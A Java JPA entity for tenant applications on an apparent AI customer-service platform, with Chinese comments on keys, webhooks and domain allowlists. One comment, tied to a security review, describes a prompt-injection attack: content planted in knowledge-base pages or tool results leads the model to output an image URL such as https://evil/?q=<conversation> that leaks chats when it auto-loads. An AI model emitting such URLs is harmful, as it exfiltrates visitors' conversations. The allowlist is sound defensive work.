package com.qingyu.care.entity;

import com.fasterxml.jackson.annotation.JsonCreator;
import jakarta.persistence.*;
import lombok.*;
import org.hibernate.annotations.CreationTimestamp;
import org.hibernate.annotations.UpdateTimestamp;

import java.time.LocalDateTime;

/**
 * 应用实体
 */
@Entity
@Table(name = "sys_application")
@Data
@Builder
// 无参构造显式标 @JsonCreator：Jackson 3 会把 @AllArgsConstructor 当隐式创建器，
// 请求体缺省的属性会以 null 传入并覆盖 @Builder.Default 初值（详见 ChatRequest 注释）。
@NoArgsConstructor(onConstructor_ = @JsonCreator)
@AllArgsConstructor
@org.hibernate.annotations.Filter(name = "tenantFilter", condition = "tenant_id = :tenantId")
public class Application {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    /**
     * 所属租户
     */
    @ManyToOne(fetch = FetchType.LAZY)
    @JoinColumn(name = "tenant_id", nullable = false)
    private Tenant tenant;

    /**
     * 应用名称
     */
    @Column(nullable = false, length = 100)
    private String name;

    /**
     * 应用标识 (用于 API 调用)
     */
    @Column(nullable = false, unique = true, length = 64)
    private String appKey;

    /**
     * 应用密钥
     */
    @Column(nullable = false, length = 128)
    private String appSecret;

    /**
     * 应用描述
     */
    @Column(columnDefinition = "TEXT")
    private String description;

    /**
     * 头像 URL
     */
    @Column(length = 255)
    private String avatar;

    /**
     * 欢迎语
     */
    @Column(columnDefinition = "TEXT")
    private String welcomeMessage;

    /**
     * 主题色
     */
    @Column(length = 20)
    @Builder.Default
    private String themeColor = "#0d9488";

    /**
     * 是否启用
     */
    @Column(nullable = false)
    @Builder.Default
    private Boolean enabled = true;

    /**
     * 开放 API 每分钟请求上限（为空则用平台默认）
     */
    @Column(name = "rate_limit_per_minute")
    private Integer rateLimitPerMinute;

    /**
     * Widget 允许的来源域名白名单（逗号分隔，如 https://a.com,https://www.a.com）。
     * 为空表示未开放 Widget 接入。
     */
    @Column(name = "allowed_origins", columnDefinition = "TEXT")
    private String allowedOrigins;

    /**
     * AI 回复卡片里的图片允许自动加载的域名（逗号分隔，支持 {@code *.example.com}）。为空表示一律不自动加载，
     * 只显示为可点击的链接。
     *
     * <p>2026-09-30 安全审查 M7：卡片 image 节点的地址由模型生成，而模型可被知识库 / 爬取页面 / 工具返回里的
     * 提示注入操纵——让它输出 {@code https://evil/?q=<对话内容>} 的图片，访客的挂件或坐席的工作台一打开就自动
     * 请求、把对话外带出去。白名单只放行租户自己信得过的图床。
     */
    @Column(name = "image_allowed_domains", columnDefinition = "TEXT")
    private String imageAllowedDomains;

    /**
     * Webhook 回调 URL。为空表示未启用 Webhook 事件推送。
     */
    @Column(name = "webhook_url", columnDefinition = "TEXT")
    private String webhookUrl;

    /**
     * Webhook 签名密钥（HMAC-SHA256）。启用/重置时生成。
     */
    @Column(name = "webhook_secret", length = 128)
    private String webhookSecret;

    /**
     * 订阅的事件类型（逗号分隔，如 session.handover_requested,session.ended）。
     */
    @Column(name = "webhook_events", columnDefinition = "TEXT")
    private String webhookEvents;

    @CreationTimestamp
    private LocalDateTime createdAt;

    @UpdateTimestamp
    private LocalDateTime updatedAt;
}
